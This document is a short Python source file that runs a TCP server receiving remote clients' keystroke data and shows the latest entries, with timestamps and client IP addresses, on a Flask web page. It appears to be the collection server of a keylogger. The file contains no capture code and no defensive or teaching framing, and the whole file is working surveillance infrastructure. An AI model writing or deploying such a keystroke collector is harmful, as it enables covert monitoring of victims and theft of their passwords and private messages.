import socket
import threading
from flask import Flask, render_template
from datetime import datetime

# Server IP and port
SERVER_IP = '0.0.0.0'  # Listen on all interfaces
SERVER_PORT = 12345

# Store keystroke data for display in web interface
keystrokes = []

# Flask web server setup
app = Flask(__name__)

@app.route('/')
def index():
    # Display the list of keystrokes on the webpage
    return render_template('index.html', keystrokes=keystrokes)

def handle_client(conn, addr):
    print(f"Connected by {addr}")
    with conn:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            # Get the current time and create a log entry
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            keystroke = data.decode()
            # Add to keystrokes list (keystroke, timestamp, client IP)
            keystrokes.append((keystroke, timestamp, addr[0]))
            # Keep the list size reasonable
            if len(keystrokes) > 50:
                keystrokes.pop(0)

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((SERVER_IP, SERVER_PORT))
        s.listen(5)  # Allow up to 5 simultaneous connections
        print(f"Server listening on port {SERVER_PORT}...")

        while True:
            conn, addr = s.accept()
            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
            client_thread.start()

if __name__ == "__main__":
    # Start the Flask web server in a separate thread
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()

    # Start the TCP server to receive keystrokes
    start_server()
